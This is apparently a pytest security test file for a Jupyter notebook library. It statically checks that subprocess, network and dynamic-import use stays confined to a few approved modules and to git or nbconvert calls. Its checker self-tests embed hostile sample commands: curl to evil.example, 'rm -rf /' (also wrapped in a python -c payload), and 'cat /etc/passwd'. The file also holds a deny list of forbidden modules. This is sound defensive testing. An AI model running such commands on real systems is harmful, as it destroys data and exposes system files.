"""product-goal.yaml's own "security" completion invariant -- a whole-package
static proof that nothing outside the deliberate, isolated execution
adapter can reach a networking, process-spawning, or dynamic-import
capability.

IPYNB-SEC-001's own 5 obligations (all already `implemented`) cover
resource-limit enforcement and the load/validate/diff/save-never-executes
boundary (test_obligation_core_path_no_execution.py's audit-hook proof).
This file adds the one check neither already provides: a package-wide
static sweep confirming no OTHER module anywhere in the package can reach
a forbidden capability, matching the identical pattern already proven for
nrrd/xliff/ubl's own SEC-001 obligations this session.

ipynb's own legitimate exceptions, each individually verified below rather
than silently allow-listed:

* ``adapters/execute.py`` imports ``subprocess`` -- this is IPYNB-EXEC-001's
  own required opt-in execution adapter, already isolation-boundary-tested
  in test_obligation_execution_adapter.py and test_obligation_core_path_no_
  execution.py. No other module may import it.
* ``cli/main.py`` imports ``subprocess`` (LIBIPYNB-P2, plans/full-parity-
  plan.md) -- the ``normalize --install``/``--uninstall``/``--status`` git
  clean-filter integration has no pure-Python way to read/write git config
  and attributes files correctly (hand-parsing ``.git/config`` would be far
  more error-prone than shelling out to the real ``git`` binary, which is
  the authoritative source of truth for its own config format). Narrowly
  scoped and independently verified below
  (``test_cli_subprocess_usage_only_ever_invokes_git``): every subprocess
  call in this file's source must have ``"git"`` as its first argument, so
  this exception cannot silently grow into "cli/main.py may spawn anything."
* ``adapters/export.py`` imports ``subprocess`` (LIBIPYNB-V5) --
  ``HtmlExporter`` shells out to ``[sys.executable, "-m", "nbconvert",
  ...]`` rather than importing ``nbconvert`` as a Python module, which
  ``src/libipynb`` must never do (``test_import_boundary.py``'s forbidden-
  imports list). Same "spawn the current interpreter" shape
  ``adapters/execute.py`` already uses, not a new class of risk.
* ``model/attachments.py`` and ``validation/rules.py`` import
  ``urllib.parse`` (``quote``/``unquote``) -- pure string encoding, no
  network I/O. ``urllib.request``/``urllib.error`` (the network-capable
  submodules) are never imported anywhere.
* ``validation/schema.py`` imports ``importlib.resources`` -- reading a
  schema file bundled inside this package's own wheel, not dynamic code
  loading. No dynamic ``importlib.import_module``/``__import__`` call
  exists anywhere in this package.
"""

from __future__ import annotations

import ast
from pathlib import Path

_SRC_ROOT = Path(__file__).resolve().parents[2] / "src" / "libipynb"

_FULLY_FORBIDDEN_MODULES = frozenset({"socket", "http", "ftplib", "smtplib", "pkgutil", "ctypes"})

#: Confined to exactly these three files; forbidden everywhere else.
#: - adapters/execute.py: the obligation-required opt-in execution adapter.
#: - cli/main.py: the CLI's git clean-filter integration (further confined
#:   to `git`-only invocations by test_cli_subprocess_usage_only_ever_invokes_git
#:   below).
#: - adapters/export.py (LIBIPYNB-V5): HtmlExporter shells out to
#:   `[sys.executable, "-m", "nbconvert", ...]` -- the same "spawn the
#:   current interpreter as a subprocess" pattern execute.py already uses,
#:   not a new class of risk -- rather than importing nbconvert as a Python
#:   module, which src/libipynb must never do (test_import_boundary.py).
_SUBPROCESS_ALLOWED_FILES = frozenset({"adapters/execute.py", "cli/main.py", "adapters/export.py"})


def _iter_source_files() -> list[Path]:
    return sorted(_SRC_ROOT.rglob("*.py"))


def _import_names(node: ast.stmt) -> list[str]:
    if isinstance(node, ast.Import):
        return [alias.name.split(".")[0] for alias in node.names]
    if isinstance(node, ast.ImportFrom) and node.module:
        return [node.module.split(".")[0]]
    return []


def test_fully_forbidden_modules_are_never_imported_anywhere() -> None:
    """No legitimate use case exists anywhere in this package for these --
    unlike subprocess/urllib/importlib, which have narrow, already-verified
    legitimate uses checked by the dedicated tests below."""
    offenders: list[str] = []
    for path in _iter_source_files():
        tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
        for node in ast.walk(tree):
            for name in _import_names(node):
                if name in _FULLY_FORBIDDEN_MODULES:
                    offenders.append(f"{path}: {name}")

    assert offenders == []


def test_subprocess_is_imported_only_by_the_execution_adapter_and_cli() -> None:
    offenders: list[str] = []
    for path in _iter_source_files():
        tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
        for node in ast.walk(tree):
            if "subprocess" in _import_names(node) and not any(
                path.as_posix().endswith(allowed) for allowed in _SUBPROCESS_ALLOWED_FILES
            ):
                offenders.append(str(path))

    assert offenders == []


#: Every process-spawning entry point subprocess exposes, not just `.run`.
#: Gate G2 found the first version of this check only matched
#: `subprocess.run(...)`; `subprocess.Popen(...)`, `.call(...)`,
#: `.check_call(...)`, `.check_output(...)`, and a `from subprocess import
#: run` bare-name call all passed through unflagged, so the "narrow
#: exception" this check exists to enforce could have silently widened
#: through any of those without detection.
_SUBPROCESS_SPAWN_FUNCS = frozenset({"run", "Popen", "call", "check_call", "check_output"})


def _subprocess_git_only_offenders(source: str, filename: str = "<test>") -> list[str]:
    """Every subprocess-spawning call site in *source* that does NOT invoke
    `git` as a list/tuple-literal first argument. Shared by the real check
    below and its own can-it-fail self-tests, so both exercise identical
    detection logic rather than the self-tests drifting from what's
    actually enforced."""
    tree = ast.parse(source, filename=filename)

    subprocess_module_aliases: set[str] = set()
    subprocess_function_aliases: dict[str, str] = {}
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                if alias.name == "subprocess":
                    subprocess_module_aliases.add(alias.asname or alias.name)
        elif isinstance(node, ast.ImportFrom) and node.module == "subprocess":
            for alias in node.names:
                if alias.name in _SUBPROCESS_SPAWN_FUNCS:
                    subprocess_function_aliases[alias.asname or alias.name] = alias.name

    offenders: list[str] = []
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        spawn_func_name: str | None = None
        if (
            isinstance(node.func, ast.Attribute)
            and isinstance(node.func.value, ast.Name)
            and node.func.value.id in subprocess_module_aliases
            and node.func.attr in _SUBPROCESS_SPAWN_FUNCS
        ):
            spawn_func_name = node.func.attr
        elif isinstance(node.func, ast.Name) and node.func.id in subprocess_function_aliases:
            spawn_func_name = subprocess_function_aliases[node.func.id]
        if spawn_func_name is None:
            continue

        if not node.args:
            offenders.append(
                f"line {node.lineno}: subprocess.{spawn_func_name}() with no positional command"
            )
            continue
        first_arg = node.args[0]
        first_element = (
            first_arg.elts[0]
            if isinstance(first_arg, (ast.List, ast.Tuple)) and first_arg.elts
            else None
        )
        if not (isinstance(first_element, ast.Constant) and first_element.value == "git"):
            offenders.append(
                f"line {node.lineno}: subprocess.{spawn_func_name}(...) not invoking 'git' first "
                "as a list/tuple literal"
            )
    return offenders


# ── The checker itself must be able to fail, or it proves nothing ──────────


def test_git_only_checker_flags_popen_call_check_call_check_output() -> None:
    hostile = (
        "import subprocess\n"
        "subprocess.Popen(['curl', 'https://evil.example'])\n"
        "subprocess.call(['whoami'])\n"
        "subprocess.check_call(['rm', '-rf', '/'])\n"
        "subprocess.check_output(['cat', '/etc/passwd'])\n"
    )
    offenders = _subprocess_git_only_offenders(hostile)
    assert len(offenders) == 4


def test_git_only_checker_flags_from_import_form() -> None:
    hostile = "from subprocess import run as _r\n_r(['curl', 'https://evil.example'])\n"
    offenders = _subprocess_git_only_offenders(hostile)
    assert len(offenders) == 1


def test_git_only_checker_does_not_flag_real_git_calls() -> None:
    benign = (
        "import subprocess\n"
        "subprocess.run(['git', 'status'])\n"
        "subprocess.run(['git', *extra_args])\n"
    )
    assert _subprocess_git_only_offenders(benign) == []


def test_cli_subprocess_usage_only_ever_invokes_git() -> None:
    """The cli/main.py exception above is deliberately narrow: it may shell
    out to `git` for its clean-filter integration, and to nothing else. This
    is a static proof, not just a code-review convention -- every
    subprocess-spawning call site (`subprocess.run`/`Popen`/`call`/
    `check_call`/`check_output`, via either `import subprocess` or
    `from subprocess import ...`) must have a first positional argument
    that is a list/tuple literal whose first element is the literal string
    "git", so this exception cannot silently grow into "cli/main.py may
    spawn arbitrary commands" without this test catching it.
    """
    path = _SRC_ROOT / "cli" / "main.py"
    offenders = _subprocess_git_only_offenders(path.read_text(encoding="utf-8"), str(path))
    assert offenders == [], offenders


def _is_sys_executable(node: ast.expr) -> bool:
    return (
        isinstance(node, ast.Attribute)
        and node.attr == "executable"
        and isinstance(node.value, ast.Name)
        and node.value.id == "sys"
    )


def _subprocess_nbconvert_only_offenders(source: str, filename: str = "<test>") -> list[str]:
    """Every subprocess-spawning call site in *source* that does NOT invoke
    `[sys.executable, "-m", "nbconvert", ...]` as a list/tuple literal
    (Gate G2 finding on LIBIPYNB-V5: the export.py subprocess exception
    needs the same kind of narrow, self-testing static proof the cli.py
    git-only exception already has -- a comment alone is not enforcement).
    """
    tree = ast.parse(source, filename=filename)

    subprocess_module_aliases: set[str] = set()
    subprocess_function_aliases: dict[str, str] = {}
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                if alias.name == "subprocess":
                    subprocess_module_aliases.add(alias.asname or alias.name)
        elif isinstance(node, ast.ImportFrom) and node.module == "subprocess":
            for alias in node.names:
                if alias.name in _SUBPROCESS_SPAWN_FUNCS:
                    subprocess_function_aliases[alias.asname or alias.name] = alias.name

    offenders: list[str] = []
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        spawn_func_name: str | None = None
        if (
            isinstance(node.func, ast.Attribute)
            and isinstance(node.func.value, ast.Name)
            and node.func.value.id in subprocess_module_aliases
            and node.func.attr in _SUBPROCESS_SPAWN_FUNCS
        ):
            spawn_func_name = node.func.attr
        elif isinstance(node.func, ast.Name) and node.func.id in subprocess_function_aliases:
            spawn_func_name = subprocess_function_aliases[node.func.id]
        if spawn_func_name is None:
            continue

        if not node.args:
            offenders.append(
                f"line {node.lineno}: subprocess.{spawn_func_name}() with no positional command"
            )
            continue
        first_arg = node.args[0]
        elements = first_arg.elts if isinstance(first_arg, (ast.List, ast.Tuple)) else None
        valid = (
            elements is not None
            and len(elements) >= 3
            and _is_sys_executable(elements[0])
            and isinstance(elements[1], ast.Constant)
            and elements[1].value == "-m"
            and isinstance(elements[2], ast.Constant)
            and elements[2].value == "nbconvert"
        )
        if not valid:
            offenders.append(
                f"line {node.lineno}: subprocess.{spawn_func_name}(...) not invoking "
                '[sys.executable, "-m", "nbconvert", ...] as a list/tuple literal'
            )
    return offenders


def test_nbconvert_only_checker_flags_arbitrary_commands() -> None:
    hostile = (
        "import subprocess\n"
        "subprocess.run(['curl', 'https://evil.example'])\n"
        "subprocess.Popen([sys.executable, '-c', 'import os; os.system(\"rm -rf /\")'])\n"
    )
    assert len(_subprocess_nbconvert_only_offenders(hostile)) == 2


def test_nbconvert_only_checker_does_not_flag_the_real_call() -> None:
    benign = (
        "import subprocess\n"
        "import sys\n"
        "subprocess.run([sys.executable, '-m', 'nbconvert', '--to', 'html', '--stdout', path])\n"
    )
    assert _subprocess_nbconvert_only_offenders(benign) == []


def test_export_subprocess_usage_only_ever_invokes_nbconvert() -> None:
    """The adapters/export.py exception above is deliberately narrow: it may
    shell out to `python -m nbconvert`, and to nothing else."""
    path = _SRC_ROOT / "adapters" / "export.py"
    offenders = _subprocess_nbconvert_only_offenders(path.read_text(encoding="utf-8"), str(path))
    assert offenders == [], offenders


def test_urllib_usage_is_confined_to_the_non_network_parse_submodule() -> None:
    """urllib.parse is pure string encoding/decoding with no network I/O.
    urllib.request/urllib.error are the network-capable submodules -- must
    never appear anywhere in this package."""
    offenders: list[str] = []
    for path in _iter_source_files():
        text = path.read_text(encoding="utf-8")
        tree = ast.parse(text, filename=str(path))
        for node in ast.walk(tree):
            if isinstance(node, ast.ImportFrom) and node.module:
                if node.module in ("urllib.request", "urllib.error"):
                    offenders.append(f"{path}: {node.module}")
                elif node.module == "urllib":
                    for alias in node.names:
                        if alias.name in ("request", "error"):
                            offenders.append(f"{path}: urllib.{alias.name}")
            elif isinstance(node, ast.Import):
                for alias in node.names:
                    if alias.name in ("urllib.request", "urllib.error"):
                        offenders.append(f"{path}: {alias.name}")

    assert offenders == []


def test_no_dynamic_import_call_exists_anywhere() -> None:
    """importlib.resources (reading this package's own bundled schema file)
    is the only legitimate importlib usage. importlib.import_module and
    the __import__ builtin -- either of which could load an
    attacker-influenced module name -- must never be called anywhere."""
    offenders: list[str] = []
    for path in _iter_source_files():
        tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                func = node.func
                if isinstance(func, ast.Name) and func.id == "__import__":
                    offenders.append(f"{path}: __import__(...)")
                elif (
                    isinstance(func, ast.Attribute)
                    and func.attr == "import_module"
                    and isinstance(func.value, ast.Name)
                    and func.value.id == "importlib"
                ):
                    offenders.append(f"{path}: importlib.import_module(...)")

    assert offenders == []


def test_no_eval_or_exec_call_exists_anywhere() -> None:
    """Independent, static complement to test_obligation_core_path_no_
    execution.py's own runtime audit-hook proof: no call site anywhere in
    the package's source even names eval/exec/compile as a callable."""
    offenders: list[str] = []
    for path in _iter_source_files():
        tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
        for node in ast.walk(tree):
            if (
                isinstance(node, ast.Call)
                and isinstance(node.func, ast.Name)
                and node.func.id in ("eval", "exec", "compile")
            ):
                offenders.append(f"{path}: {node.func.id}(...)")

    assert offenders == []
